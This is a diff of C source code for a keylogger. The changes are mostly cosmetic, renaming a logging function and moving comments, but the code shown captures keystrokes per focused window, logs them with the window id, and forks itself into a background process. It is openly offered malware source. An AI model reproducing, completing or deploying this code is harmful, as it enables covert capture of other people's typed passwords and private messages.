@@ -38,7 +38,7 @@ void handleArgs(int argc, char* argv[]) {
     }
 }
 
-void Log(const char * fmt, ...) {
+void log(const char * fmt, ...) {
 
     va_list va_alist;
     char buf[2048], logbuf[2048];
@@ -99,11 +99,13 @@ void keylogger() {
     int logging = 0;
 
     while(1)
-    {   
+    { 
+
         usleep(SLEEP);
+
         if ((logging == 1) && ((time(NULL) > timeout) || (focusWin != oldfocusWin))) {
             logging = 0;
-            Log(" [%x] %s\n", focusWin, b->buffer);
+            log(" [%x] %s\n", focusWin, b->buffer);
             emptyData(b);
         }
             
@@ -157,7 +159,7 @@ void keylogger() {
                         }
 
                         if (focusWin != oldfocusWin) {
-                            Log("change [%x] %s\n", focusWin, b->buffer);
+                            log("change [%x] %s\n", focusWin, b->buffer);
                             emptyData(b);
                         }
 
@@ -187,14 +189,20 @@ void keylogger() {
 void createProccess() {
     pid_t pid;
     pid = fork();
-    if (pid > 0) {  // If main, fork.
+
+    // If main, fork.
+    if (pid > 0) {
         printf("Main: Creating proccess (PID: %i)\n", pid);
         return;
     }
-    if (pid == -1) {    // If error...
+
+    // If error...
+    if (pid == -1) {
         printf("Error while trying to fork!");
         return;
     }
+
+    // If proccess, run keylogger.
     if (pid == 0) {
         keylogger();
     }
